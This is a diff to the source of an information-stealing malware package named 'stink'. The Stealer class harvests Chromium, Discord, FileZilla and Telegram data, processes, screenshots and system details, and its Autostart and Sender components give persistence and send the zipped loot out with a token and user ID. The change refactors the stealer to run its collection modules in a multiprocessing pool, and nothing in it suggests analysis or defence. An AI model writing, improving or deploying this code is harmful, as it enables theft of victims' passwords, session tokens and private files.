@@ -2,11 +2,13 @@ from sys import argv
 from shutil import rmtree
 from threading import Thread
 from os import path, makedirs
+from multiprocessing import Pool
 
-from .modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram
-from .helpers.config import MultistealerConfig
-from .utils import Autostart, Sender
-from .enums import Features, Utils
+from stink.helpers import functions
+from stink.enums import Features, Utils
+from stink.utils import Autostart, Sender
+from stink.helpers.config import MultistealerConfig
+from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram
 
 
 class Stealer(Thread):
@@ -155,11 +157,8 @@ class Stealer(Thread):
 
             self.__create_storage()
 
-            for method in self.methods:
-                if method["status"] is True: method["object"].start()
-
-            for method in self.methods:
-                if method["status"] is True: method["object"].join()
+            with Pool(processes=self.config.PoolSize) as pool:
+                pool.map(functions.run_process, [method["object"] for method in self.methods])
 
             Sender(self.config.ZipName, self.config.StoragePath, self.token, self.user_id, self.errors).run()
 
